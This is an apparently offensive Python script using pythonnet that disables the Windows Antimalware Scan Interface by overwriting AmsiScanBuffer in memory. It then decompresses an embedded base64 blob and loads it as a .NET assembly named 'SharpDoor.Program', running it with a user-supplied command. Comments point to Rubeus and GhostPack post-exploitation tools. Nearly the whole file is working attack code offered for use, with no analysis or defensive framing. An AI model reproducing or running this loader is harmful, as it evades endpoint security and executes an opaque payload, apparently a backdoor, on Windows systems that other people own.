import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpDoor.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()